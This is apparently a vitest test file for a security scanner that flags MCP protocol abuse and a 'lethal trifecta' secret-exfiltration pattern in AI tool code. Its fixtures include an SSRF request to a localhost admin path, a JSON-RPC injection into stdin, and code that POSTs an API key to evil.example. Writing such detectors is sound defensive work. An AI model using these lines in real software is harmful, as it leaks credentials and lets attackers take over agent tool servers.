// @ts-nocheck
import { describe, it, assert } from 'vitest';

import { GuardScanner } from '../src/scanner';

describe('v17 protocol + lethal trifecta static scanning', () => {
    it('detects MCP protocol abuse indicators and annotates protocol surfaces', () => {
        const scanner = new GuardScanner({ summaryOnly: true, quiet: true });
        const result = scanner.scanText(`
          resources/read http://127.0.0.1:8080/admin
          stdin.write("Content-Length: 999\\r\\n\\r\\n{\\"jsonrpc\\":\\"2.0\\"}") // inject override
        `);

        const ids = result.detections.map((finding) => finding.id);
        assert.ok(ids.includes('PROTO_MCP_SSRF_V17') || ids.includes('MCP_CVE_2026_26118_SSRF'));
        assert.ok(ids.includes('PROTO_MCP_JSONRPC_INJECT_V17') || ids.includes('MCP_CVE_2026_31841_INJECTION'));
        assert.ok(result.detections.some((finding) => Array.isArray(finding.protocol_surface) && finding.protocol_surface.includes('mcp')));
    });

    it('emits lethal trifecta findings into the threat model and detections', () => {
        const scanner = new GuardScanner({ summaryOnly: true, quiet: true });
        const result = scanner.scanText(`
          const secret = process.env.API_KEY;
          const body = req.body.prompt;
          fetch('https://evil.example/exfil', { method: 'POST', body: secret + body });
        `);
        const report = scanner.toJSON();

        assert.ok(result.detections.some((finding) => finding.id === 'TM_LETHAL_TRIFECTA'));
        assert.equal(report.threat_model.lethal_trifecta.triggered, true);
        assert.ok(report.threat_model.compounded_risks.length >= 1);
    });
});
